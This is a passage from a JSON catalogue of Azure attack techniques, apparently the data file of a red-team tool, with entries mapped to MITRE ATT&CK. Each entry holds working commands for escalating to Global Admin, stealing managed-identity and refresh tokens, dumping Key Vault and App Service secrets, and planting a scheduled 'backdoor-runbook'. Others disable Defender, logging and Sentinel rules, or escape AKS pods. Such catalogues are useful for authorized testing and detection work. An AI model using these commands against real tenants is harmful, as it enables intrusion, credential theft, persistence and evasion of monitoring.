        "az managedservices assignment create --definition <definition-id> --registration <registration-id>"
      ]
    },
    {
      "id": "AZ-PRIVESC-002",
      "mitre_id": "T1548",
      "name": "Azure AD Role Assignment",
      "phase": "privilege_escalation",
      "infrastructure": "azure",
      "description": "Assign Azure AD admin roles to controlled accounts (Global Admin, etc.)",
      "prerequisites": ["Privileged Role Administrator or Global Admin"],
      "tools": ["Azure CLI", "Az PowerShell", "Graph API"],
      "detection": "Azure AD audit logs, admin role changes",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["AZ-PERSIST-002", "AZ-CRED-003"],
      "risk_level": "critical",
      "commands": [
        "# Azure CLI - Add user to Global Administrator role",
        "az ad group member add --group 'Global Administrators' --member-id <user-object-id>",
        "# Azure CLI - Add to Application Administrator role",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3/members/$ref' --body '{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/<user-object-id>\"}'",
        "# Azure PowerShell - Assign directory role",
        "Add-AzureADDirectoryRoleMember -ObjectId <role-object-id> -RefObjectId <user-object-id>",
        "# Azure PowerShell - Get directory role by name",
        "$role = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq 'Global Administrator'}",
        "Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId <user-object-id>",
        "# Microsoft Graph - Assign Azure AD role",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments' --body '{\"principalId\":\"<user-id>\",\"roleDefinitionId\":\"<role-template-id>\",\"directoryScopeId\":\"/\"}'",
        "# Activate PIM (Privileged Identity Management) eligible role",
        "az rest --method POST --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests' --body '{\"action\":\"selfActivate\",\"principalId\":\"<user-id>\",\"roleDefinitionId\":\"<role-id>\",\"justification\":\"Urgent admin task\"}'",
        "# AADInternals - Set user as Global Admin",
        "Set-AADIntUserAsAdmin -ObjectId <user-object-id>",
        "# List users with admin roles",
        "az ad group member list --group 'Global Administrators' --output table",
        "# Find PIM eligible assignments",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances'"
      ]
    },
    {
      "id": "AZ-PRIVESC-003",
      "mitre_id": "T1078.004",
      "name": "Managed Identity Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "azure",
      "description": "Abuse VM or App Service managed identity to access Azure resources",
      "prerequisites": ["Access to resource with managed identity"],
      "tools": ["Azure CLI", "IMDS endpoint", "Custom scripts"],
      "detection": "Azure Activity Logs, managed identity token requests",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["AZ-COLL-001", "AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Get access token from IMDS endpoint (from within Azure VM)",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
        "# Get token for specific resource (Graph API)",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/'",
        "# Get token for Key Vault",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/'",
        "# Get token for Storage",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'",
        "# PowerShell - Get managed identity token",
        "$response = Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata='true'}",
        "$token = $response.access_token",
        "# Use token with Azure CLI",
        "az login --identity",
        "az account show",
        "# Use token with Azure PowerShell",
        "Connect-AzAccount -Identity",
        "Get-AzContext",
        "# App Service managed identity (different endpoint)",
        "curl \"$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/\" -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER\"",
        "# Check what permissions the managed identity has",
        "az role assignment list --assignee <managed-identity-principal-id> --all",
        "# Use obtained token to access resources",
        "curl -H 'Authorization: Bearer <token>' 'https://management.azure.com/subscriptions?api-version=2020-01-01'"
      ]
    },
    {
      "id": "AZ-PRIVESC-004",
      "mitre_id": "T1548",
      "name": "Automation Account RunAs Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "azure",
      "description": "Abuse Automation Account RunAs account to escalate privileges",
      "prerequisites": ["Automation Account access"],
      "tools": ["Azure Portal", "Az PowerShell"],
      "detection": "Azure Activity Logs, Automation job execution",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["AZ-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List automation accounts",
        "az automation account list --output table",
        "# Azure CLI - List runbooks in automation account",
        "az automation runbook list --automation-account-name aa-name --resource-group rg-name --output table",
        "# Azure CLI - Get automation account Run As certificate",
        "az automation account show --name aa-name --resource-group rg-name",
        "# Azure PowerShell - Get automation connection (RunAs account)",
        "Get-AzAutomationConnection -ResourceGroupName rg-name -AutomationAccountName aa-name -Name 'AzureRunAsConnection'",
        "# Azure PowerShell - Create malicious runbook",
        "$runbookContent = 'Get-AzSubscription | ForEach-Object { ... }'",
        "Import-AzAutomationRunbook -ResourceGroupName rg-name -AutomationAccountName aa-name -Name 'backdoor-runbook' -Type PowerShell -Content $runbookContent",
        "# Azure PowerShell - Publish runbook",
        "Publish-AzAutomationRunbook -ResourceGroupName rg-name -AutomationAccountName aa-name -Name 'backdoor-runbook'",
        "# Azure PowerShell - Start runbook",
        "Start-AzAutomationRunbook -ResourceGroupName rg-name -AutomationAccountName aa-name -Name 'backdoor-runbook'",
        "# Extract RunAs certificate from automation account",
        "# In runbook: $connection = Get-AutomationConnection -Name 'AzureRunAsConnection'",
        "# $cert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'",
        "# Use MicroBurst to extract credentials",
        "Get-AzurePasswords -Verbose",
        "# Check permissions of RunAs service principal",
        "az role assignment list --assignee <run-as-sp-app-id> --all",
        "# Schedule runbook for persistence",
        "New-AzAutomationSchedule -ResourceGroupName rg-name -AutomationAccountName aa-name -Name 'daily-run' -StartTime (Get-Date).AddDays(1) -DayInterval 1",
        "Register-AzAutomationScheduledRunbook -ResourceGroupName rg-name -AutomationAccountName aa-name -RunbookName 'backdoor-runbook' -ScheduleName 'daily-run'"
      ]
    },
    {
      "id": "AZ-DEFENSE-001",
      "mitre_id": "T1562.008",
      "name": "Azure Diagnostic Settings Disable",
      "phase": "defense_evasion",
      "infrastructure": "azure",
      "description": "Disable Azure diagnostic settings and log forwarding",
      "prerequisites": ["Monitoring Contributor role"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, diagnostic setting changes",
      "references": ["https://attack.mitre.org/techniques/T1562/008/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List diagnostic settings for a resource",
        "az monitor diagnostic-settings list --resource <resource-id>",
        "# Azure CLI - Delete diagnostic settings",
        "az monitor diagnostic-settings delete --name setting-name --resource <resource-id>",
        "# Azure CLI - List activity log profiles",
        "az monitor log-profiles list",
        "# Azure CLI - Delete activity log profile",
        "az monitor log-profiles delete --name profile-name",
        "# Azure PowerShell - Get diagnostic settings",
        "Get-AzDiagnosticSetting -ResourceId <resource-id>",
        "# Azure PowerShell - Remove diagnostic setting",
        "Remove-AzDiagnosticSetting -ResourceId <resource-id> -Name setting-name",
        "# Disable Log Analytics workspace",
        "az monitor log-analytics workspace update --resource-group rg-name --workspace-name workspace-name --retention-time 30",
        "# Delete Log Analytics workspace",
        "az monitor log-analytics workspace delete --resource-group rg-name --workspace-name workspace-name --force",
        "# Disable Azure AD audit log streaming",
        "az monitor diagnostic-settings delete --name aad-diag --resource /providers/microsoft.aadiam/diagnosticSettings/aad-diag",
        "# Modify NSG flow logs",
        "az network watcher flow-log configure --nsg nsg-name --resource-group rg-name --enabled false",
        "# Delete Azure Sentinel analytics rules",
        "az sentinel alert-rule delete --resource-group rg-name --workspace-name ws-name --name rule-name",
        "# Clear storage account logs",
        "az storage blob delete-batch --account-name storageacct --source '$logs'"
      ]
    },
    {
      "id": "AZ-DEFENSE-002",
      "mitre_id": "T1562.001",
      "name": "Defender for Cloud Disable",
      "phase": "defense_evasion",
      "infrastructure": "azure",
      "description": "Disable Microsoft Defender for Cloud protections",
      "prerequisites": ["Security Admin role"],
      "tools": ["Azure CLI", "Az PowerShell", "Azure Portal"],
      "detection": "Azure Activity Logs, Defender status changes",
      "references": ["https://attack.mitre.org/techniques/T1562/001/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Azure CLI - Check current Defender pricing tier",
        "az security pricing list --output table",
        "# Azure CLI - Disable Defender for Servers",
        "az security pricing create --name VirtualMachines --tier Free",
        "# Azure CLI - Disable Defender for Storage",
        "az security pricing create --name StorageAccounts --tier Free",
        "# Azure CLI - Disable Defender for SQL",
        "az security pricing create --name SqlServers --tier Free",
        "# Azure CLI - Disable Defender for Containers",
        "az security pricing create --name Containers --tier Free",
        "# Azure CLI - Disable Defender for Key Vault",
        "az security pricing create --name KeyVaults --tier Free",
        "# Azure CLI - Disable Defender for App Service",
        "az security pricing create --name AppServices --tier Free",
        "# Azure PowerShell - Disable Defender plans",
        "Set-AzSecurityPricing -Name 'VirtualMachines' -PricingTier 'Free'",
        "# Disable auto-provisioning of agents",
        "az security auto-provisioning-setting update --name default --auto-provision Off",
        "# Azure PowerShell - Disable auto-provisioning",
        "Set-AzSecurityAutoProvisioningSetting -Name 'default' -EnableAutoProvision 'Off'",
        "# Disable Defender for Cloud email notifications",
        "az security contact create --name default1 --email '' --alert-notifications Off --alerts-admins Off",
        "# Suppress security alerts",
        "az security alert update --location <location> --name <alert-name> --status Dismissed",
        "# Disable just-in-time VM access",
        "az security jit-policy delete --name default --resource-group rg-name --location <location>"
      ]
    },
    {
      "id": "AZ-CRED-001",
      "mitre_id": "T1528",
      "name": "Azure AD Token Theft",
      "phase": "credential_access",
      "infrastructure": "azure",
      "description": "Steal Azure AD access tokens from browsers, applications, or token caches",
      "prerequisites": ["Access to user workstation or browser"],
      "tools": ["ROADtools", "AADInternals", "TokenTactics"],
      "detection": "Azure AD sign-in logs, impossible travel",
      "references": ["https://attack.mitre.org/techniques/T1528/"],
      "next_techniques": ["AZ-EXEC-001", "AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# ROADtools - Dump tokens from ROADtools token storage",
        "roadrecon auth --tokens-file tokens.json",
        "# AADInternals - Get access token from cache",
        "Get-AADIntAccessTokenFromCache",
        "# AADInternals - Get access token interactively (captures token)",
        "Get-AADIntAccessTokenForMSGraph",
        "# TokenTactics - Refresh token to access token",
        "Import-Module TokenTactics.psd1",
        "RefreshTo-MSGraph -RefreshToken $refreshToken -TenantId <tenant-id>",
        "# TokenTactics - Device code phishing flow",
        "Get-DeviceCodeFlow -ClientId <app-id>",
        "# TokenTactics - Get token for Azure management",
        "RefreshTo-AzureManagement -RefreshToken $refreshToken",
        "# Extract tokens from Azure CLI cache (Linux)",
        "cat ~/.azure/accessTokens.json",
        "cat ~/.azure/msal_token_cache.json",
        "# Extract tokens from Azure CLI cache (Windows)",
        "type %USERPROFILE%\\.azure\\accessTokens.json",
        "type %USERPROFILE%\\.azure\\msal_token_cache.json",
        "# Extract tokens from Azure PowerShell cache",
        "cat ~/.Azure/TokenCache.dat",
        "cat ~/.Azure/AzureRmContext.json",
        "# Mimikatz - Extract Azure tokens from memory",
        "sekurlsa::cloudap",
        "# Browser cookie theft for Azure portal session",
        "# Extract cookies from: login.microsoftonline.com, portal.azure.com",
        "# SharpChrome for Edge/Chrome cookie extraction",
        "SharpChrome.exe cookies /showall",
        "# Use stolen refresh token",
        "curl -X POST 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token' -d 'client_id=<app-id>&refresh_token=<stolen-refresh-token>&grant_type=refresh_token&scope=https://graph.microsoft.com/.default'"
      ]
    },
    {
      "id": "AZ-CRED-002",
      "mitre_id": "T1552.005",
      "name": "Azure VM IMDS Credential Theft",
      "phase": "credential_access",
      "infrastructure": "azure",
      "description": "Access Azure VM Instance Metadata Service to steal managed identity tokens",
      "prerequisites": ["Access to Azure VM"],
      "tools": ["curl", "Custom scripts"],
      "detection": "VM logs, IMDS access monitoring",
      "references": ["https://attack.mitre.org/techniques/T1552/005/"],
      "next_techniques": ["AZ-PRIVESC-003", "AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Get VM instance metadata",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq",
        "# Get access token for Azure Resource Manager",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
        "# Get access token for Microsoft Graph",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/'",
        "# Get access token for Key Vault",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/'",
        "# Get access token for Azure Storage",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'",
        "# Get access token for Azure SQL",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/'",
        "# PowerShell version",
        "$response = Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata='true'}",
        "# Get user-assigned managed identity token (specify client_id)",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<user-assigned-mi-client-id>'",
        "# Get scheduled events (VM maintenance info)",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01'",
        "# Get attestation data",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/attested/document?api-version=2020-09-01'",
        "# Use token with Azure REST API",
        "TOKEN=$(curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq -r '.access_token')",
        "curl -H \"Authorization: Bearer $TOKEN\" 'https://management.azure.com/subscriptions?api-version=2020-01-01'"
      ]
    },
    {
      "id": "AZ-CRED-003",
      "mitre_id": "T1552.001",
      "name": "Key Vault Secret Extraction",
      "phase": "credential_access",
      "infrastructure": "azure",
      "description": "Extract secrets, keys, and certificates from Azure Key Vault",
      "prerequisites": ["Key Vault access permissions"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Key Vault audit logs, unusual secret access",
      "references": ["https://attack.mitre.org/techniques/T1552/001/"],
      "next_techniques": ["AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List all Key Vaults in subscription",
        "az keyvault list --output table",
        "# Azure CLI - List secrets in a Key Vault",
        "az keyvault secret list --vault-name vault-name --output table",
        "# Azure CLI - Get secret value",
        "az keyvault secret show --vault-name vault-name --name secret-name --query value -o tsv",
        "# Azure CLI - Download all secrets from a vault",
        "for secret in $(az keyvault secret list --vault-name vault-name --query '[].name' -o tsv); do echo \"$secret: $(az keyvault secret show --vault-name vault-name --name $secret --query value -o tsv)\"; done",
        "# Azure CLI - List keys",
        "az keyvault key list --vault-name vault-name --output table",
        "# Azure CLI - List certificates",
        "az keyvault certificate list --vault-name vault-name --output table",
        "# Azure CLI - Download certificate with private key",
        "az keyvault certificate download --vault-name vault-name --name cert-name --file cert.pfx --encoding PEM",
        "# Azure PowerShell - Get secret value",
        "$secret = Get-AzKeyVaultSecret -VaultName vault-name -Name secret-name -AsPlainText",
        "# Azure PowerShell - Get all secrets",
        "Get-AzKeyVaultSecret -VaultName vault-name | ForEach-Object { Get-AzKeyVaultSecret -VaultName vault-name -Name $_.Name -AsPlainText }",
        "# Azure PowerShell - Get certificate with private key",
        "$cert = Get-AzKeyVaultCertificate -VaultName vault-name -Name cert-name",
        "$secret = Get-AzKeyVaultSecret -VaultName vault-name -Name $cert.Name -AsPlainText",
        "# Check Key Vault access policies",
        "az keyvault show --name vault-name --query 'properties.accessPolicies'",
        "# Get deleted secrets (soft-delete)",
        "az keyvault secret list-deleted --vault-name vault-name",
        "# Recover deleted secret",
        "az keyvault secret recover --vault-name vault-name --name secret-name"
      ]
    },
    {
      "id": "AZ-CRED-004",
      "mitre_id": "T1552",
      "name": "App Service Configuration Secrets",
      "phase": "credential_access",
      "infrastructure": "azure",
      "description": "Extract secrets from App Service configuration and environment variables",
      "prerequisites": ["Website Contributor or Reader role"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, config access events",
      "references": ["https://attack.mitre.org/techniques/T1552/"],
      "next_techniques": ["AZ-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List App Services",
        "az webapp list --output table",
        "# Azure CLI - Get app settings (environment variables)",
        "az webapp config appsettings list --name webapp-name --resource-group rg-name --output table",
        "# Azure CLI - Get connection strings",
        "az webapp config connection-string list --name webapp-name --resource-group rg-name --output table",
        "# Azure CLI - Get publishing credentials",
        "az webapp deployment list-publishing-credentials --name webapp-name --resource-group rg-name",
        "# Azure CLI - Get Function App settings",
        "az functionapp config appsettings list --name funcapp-name --resource-group rg-name",
        "# Azure CLI - Get source control configuration",
        "az webapp deployment source show --name webapp-name --resource-group rg-name",
        "# Azure PowerShell - Get app settings",
        "(Get-AzWebApp -ResourceGroupName rg-name -Name webapp-name).SiteConfig.AppSettings",
        "# Azure PowerShell - Get connection strings",
        "(Get-AzWebApp -ResourceGroupName rg-name -Name webapp-name).SiteConfig.ConnectionStrings",
        "# Access Kudu console for more secrets",
        "curl -u 'username:password' https://webapp-name.scm.azurewebsites.net/api/settings",
        "# Get environment variables via Kudu",
        "curl -u 'username:password' https://webapp-name.scm.azurewebsites.net/api/environment",
        "# Download web.config (may contain secrets)",
        "curl -u 'username:password' https://webapp-name.scm.azurewebsites.net/api/vfs/site/wwwroot/web.config",
        "# Get deployment history",
        "az webapp deployment list --name webapp-name --resource-group rg-name",
        "# Check for Key Vault references in app settings",
        "az webapp config appsettings list --name webapp-name --resource-group rg-name --query \"[?contains(value,'@Microsoft.KeyVault')]\""
      ]
    },
    {
      "id": "AZ-DISC-001",
      "mitre_id": "T1580",
      "name": "Azure Infrastructure Discovery",
      "phase": "discovery",
      "infrastructure": "azure",
      "description": "Enumerate VMs, networks, storage, and other Azure resources",
      "prerequisites": ["Reader role on subscription"],
      "tools": ["Azure CLI", "Az PowerShell", "ROADtools"],
      "detection": "Azure Activity Logs, resource enumeration",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["AZ-LATERAL-001"],
      "risk_level": "low",
      "commands": [
        "# Azure CLI - List all VMs with details",
        "az vm list --show-details --output table",
        "# Azure CLI - List VM sizes and IPs",
        "az vm list -d --query '[].{Name:name,RG:resourceGroup,IP:publicIps,PrivateIP:privateIps,State:powerState}'",
        "# Azure CLI - List virtual networks",
        "az network vnet list --output table",
        "# Azure CLI - List subnets",
        "az network vnet subnet list --resource-group rg-name --vnet-name vnet-name --output table",
        "# Azure CLI - List network security groups",
        "az network nsg list --output table",
        "# Azure CLI - Show NSG rules",
        "az network nsg rule list --nsg-name nsg-name --resource-group rg-name --output table",
        "# Azure CLI - List public IP addresses",
        "az network public-ip list --output table",
        "# Azure CLI - List load balancers",
        "az network lb list --output table",
        "# Azure CLI - List App Services",
        "az webapp list --output table",
        "# Azure CLI - List SQL servers and databases",
        "az sql server list --output table",
        "az sql db list --server server-name --resource-group rg-name --output table",
        "# Azure CLI - List AKS clusters",
        "az aks list --output table",
        "# Azure PowerShell - Get network configuration",
        "Get-AzVirtualNetwork | Select-Object Name, ResourceGroupName, Location, AddressSpace",
        "# Azure PowerShell - Get storage accounts",
        "Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName, PrimaryLocation",
        "# ROADtools - Comprehensive Azure resource dump",
        "roadrecon plugin azurerm",
        "# AzureHound - BloodHound-style enumeration",
        "azurehound -u user@target.com list --tenant tenant-id -o azurehound-output.json"
      ]
    },
    {
      "id": "AZ-DISC-002",
      "mitre_id": "T1069.003",
      "name": "Azure AD Group Discovery",
      "phase": "discovery",
      "infrastructure": "azure",
      "description": "Enumerate Azure AD groups and membership for privilege mapping",
      "prerequisites": ["Azure AD Reader role"],
      "tools": ["AzureHound", "ROADtools", "Graph API"],
      "detection": "Azure AD audit logs, Graph API calls",
      "references": ["https://attack.mitre.org/techniques/T1069/003/"],
      "next_techniques": ["AZ-PRIVESC-001"],
      "risk_level": "low",
      "commands": [
        "# Azure CLI - List all groups",
        "az ad group list --output table",
        "# Azure CLI - Get group members",
        "az ad group member list --group 'group-name' --output table",
        "# Azure CLI - Find admin groups",
        "az ad group list --query \"[?contains(displayName,'Admin')].{Name:displayName,Id:id}\"",
        "# Azure CLI - List groups for a user",
        "az ad user get-member-groups --id user@target.com",
        "# Azure PowerShell - Get all groups",
        "Get-AzureADGroup -All $true",
        "# Azure PowerShell - Get group members",
        "Get-AzureADGroupMember -ObjectId <group-object-id> -All $true",
        "# Azure PowerShell - Find privileged groups",
        "Get-AzureADDirectoryRole | ForEach-Object { Write-Output \"$($_.DisplayName):\"; Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Select-Object DisplayName }",
        "# Microsoft Graph API - List groups",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/groups'",
        "# Microsoft Graph API - Get group members",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/groups/<group-id>/members'",
        "# Microsoft Graph API - Get transitive members (nested)",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/groups/<group-id>/transitiveMembers'",
        "# ROADtools - Dump all group memberships",
        "roadrecon gather",
        "roadrecon gui  # Then explore groups in browser",
        "# AzureHound - Collect group data for BloodHound",
        "azurehound -u user@target.com list groups",
        "# Find groups with role assignments",
        "az role assignment list --all --query \"[?principalType=='Group'].{Group:principalName,Role:roleDefinitionName,Scope:scope}\""
      ]
    },
    {
      "id": "AZ-LATERAL-001",
      "mitre_id": "T1021.007",
      "name": "Azure Bastion/Serial Console Access",
      "phase": "lateral_movement",
      "infrastructure": "azure",
      "description": "Use Azure Bastion or serial console to access VMs without public endpoints",
      "prerequisites": ["VM access permissions", "Bastion configured"],
      "tools": ["Azure Portal", "Azure CLI"],
      "detection": "Azure Activity Logs, Bastion connection logs",
      "references": ["https://attack.mitre.org/techniques/T1021/007/"],
      "next_techniques": ["AZ-CRED-002", "AZ-COLL-002"],
      "risk_level": "medium",
      "commands": [
        "# Azure CLI - List Bastion hosts",
        "az network bastion list --output table",
        "# Azure CLI - Connect to VM via Bastion (SSH)",
        "az network bastion ssh --name bastion-name --resource-group rg-name --target-resource-id /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<vm-name> --auth-type password --username adminuser",
        "# Azure CLI - Connect to VM via Bastion (SSH with key)",
        "az network bastion ssh --name bastion-name --resource-group rg-name --target-resource-id <vm-resource-id> --auth-type ssh-key --username adminuser --ssh-key ~/.ssh/id_rsa",
        "# Azure CLI - Connect to Windows VM via Bastion (RDP)",
        "az network bastion rdp --name bastion-name --resource-group rg-name --target-resource-id <vm-resource-id>",
        "# Azure CLI - Create tunnel through Bastion",
        "az network bastion tunnel --name bastion-name --resource-group rg-name --target-resource-id <vm-resource-id> --resource-port 22 --port 2222",
        "# Then SSH through tunnel: ssh -p 2222 adminuser@127.0.0.1",
        "# Access Serial Console (requires boot diagnostics enabled)",
        "# Via Portal: VM > Support + troubleshooting > Serial console",
        "# Azure CLI - Enable boot diagnostics for serial console",
        "az vm boot-diagnostics enable --name vmname --resource-group rg-name --storage <storage-account-uri>",
        "# Azure CLI - Get serial console output",
        "az vm boot-diagnostics get-boot-log --name vmname --resource-group rg-name",
        "# Check if VM has public IP or needs Bastion",
        "az vm list-ip-addresses --name vmname --resource-group rg-name --output table",
        "# List VMs accessible via Bastion",
        "az vm list --query \"[?networkProfile.networkInterfaces[0].id contains 'bastion-enabled-vnet']\"",
        "# Connect using AAD authentication (if configured)",
        "az network bastion ssh --name bastion-name --resource-group rg-name --target-resource-id <vm-resource-id> --auth-type AAD"
      ]
    },
    {
      "id": "AZ-LATERAL-002",
      "mitre_id": "T1550.001",
      "name": "Cross-Subscription Movement",
      "phase": "lateral_movement",
      "infrastructure": "azure",
      "description": "Move to other Azure subscriptions using shared identities or role assignments",
      "prerequisites": ["Multi-subscription access"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, cross-subscription operations",
      "references": ["https://attack.mitre.org/techniques/T1550/001/"],
      "next_techniques": ["AZ-RECON-004"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List all accessible subscriptions",
        "az account list --output table",
        "# Azure CLI - Switch subscription context",
        "az account set --subscription '<subscription-id-or-name>'",
        "# Azure CLI - List resources in new subscription",
        "az resource list --output table",
        "# Azure CLI - Check role assignments across subscriptions",
        "az role assignment list --all --query \"[].{Sub:scope,Role:roleDefinitionName,Principal:principalName}\"",
        "# Azure PowerShell - Get all subscriptions",
        "Get-AzSubscription",
        "# Azure PowerShell - Set subscription context",
        "Set-AzContext -SubscriptionId '<subscription-id>'",
        "# Azure PowerShell - Loop through all subscriptions",
        "Get-AzSubscription | ForEach-Object { Set-AzContext -SubscriptionId $_.Id; Get-AzResource }",
        "# Check management group hierarchy",
        "az account management-group list",
        "# Get management group with children",
        "az account management-group show --name <mg-name> --expand --recurse",
        "# Check for Azure Lighthouse delegations (cross-tenant)",
        "az managedservices assignment list",
        "# Find subscriptions where service principal has access",
        "az role assignment list --assignee <sp-app-id> --all --output table",
        "# Access resources using same identity in different subscription",
        "az account set --subscription 'other-subscription'",
        "az keyvault list  # Check Key Vaults in new subscription",
        "# ROADtools - Gather from multiple subscriptions",
        "roadrecon gather --subscription <sub-id-1>",
        "roadrecon gather --subscription <sub-id-2>"
      ]
    },
    {
      "id": "AZ-LATERAL-003",
      "mitre_id": "T1021",
      "name": "AKS Pod Movement",
      "phase": "lateral_movement",
      "infrastructure": "azure",
      "description": "Move laterally within AKS clusters using compromised pods or service accounts",
      "prerequisites": ["Access to AKS pod"],
      "tools": ["kubectl", "Custom scripts"],
      "detection": "AKS audit logs, network policies",
      "references": ["https://attack.mitre.org/techniques/T1021/"],
      "next_techniques": ["AZ-CRED-002"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List AKS clusters",
        "az aks list --output table",
        "# Azure CLI - Get AKS credentials",
        "az aks get-credentials --resource-group rg-name --name aks-cluster-name",
        "# kubectl - List pods in all namespaces",
        "kubectl get pods --all-namespaces",
        "# kubectl - List service accounts",
        "kubectl get serviceaccounts --all-namespaces",
        "# kubectl - Get pod with high privileges",
        "kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.securityContext.privileged==true)'",
        "# kubectl - Exec into pod",
        "kubectl exec -it pod-name -n namespace -- /bin/bash",
        "# kubectl - Get secrets",
        "kubectl get secrets --all-namespaces",
        "kubectl get secret secret-name -n namespace -o jsonpath='{.data}' | base64 -d",
        "# kubectl - Get service account token",
        "kubectl get secret $(kubectl get sa default -n default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d",
        "# Access Azure IMDS from pod (if not restricted)",
        "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
        "# kubectl - Create privileged pod for escape",
        "kubectl run priv-pod --image=alpine --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"priv\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true}}]}}'",
        "# Access host filesystem from privileged container",
        "kubectl exec -it priv-pod -- nsenter -t 1 -m -u -i -n bash",
        "# kubectl - Check pod RBAC permissions",
        "kubectl auth can-i --list",
        "# Use kubeletctl for direct kubelet API access",
        "kubeletctl -s <node-ip> pods"
      ]
    },
    {
      "id": "AZ-COLL-001",
      "mitre_id": "T1530",
      "name": "Azure Blob Data Collection",
      "phase": "collection",
      "infrastructure": "azure",
      "description": "Access and download sensitive data from Azure Blob storage",
      "prerequisites": ["Storage Blob Data Reader role or SAS token"],
      "tools": ["Azure CLI", "AzCopy", "Storage Explorer"],
      "detection": "Storage account logs, unusual data access",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["AZ-EXFIL-001"],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - List storage accounts",
        "az storage account list --output table",
        "# Azure CLI - List containers",
        "az storage container list --account-name storageacct --auth-mode login --output table",
        "# Azure CLI - List blobs in container",
        "az storage blob list --account-name storageacct --container-name containername --auth-mode login --output table",
        "# Azure CLI - Download single blob",
        "az storage blob download --account-name storageacct --container-name containername --name blobname --file ./downloaded-file --auth-mode login",
        "# Azure CLI - Download entire container",
        "az storage blob download-batch --account-name storageacct --source containername --destination ./download-dir --auth-mode login",
        "# AzCopy - High performance blob download",
        "azcopy login",
        "azcopy copy 'https://storageacct.blob.core.windows.net/containername/*' './local-dir' --recursive",
        "# AzCopy - Copy with SAS token",
        "azcopy copy 'https://storageacct.blob.core.windows.net/containername?<sas-token>' './local-dir' --recursive",
        "# Azure PowerShell - Get storage context",
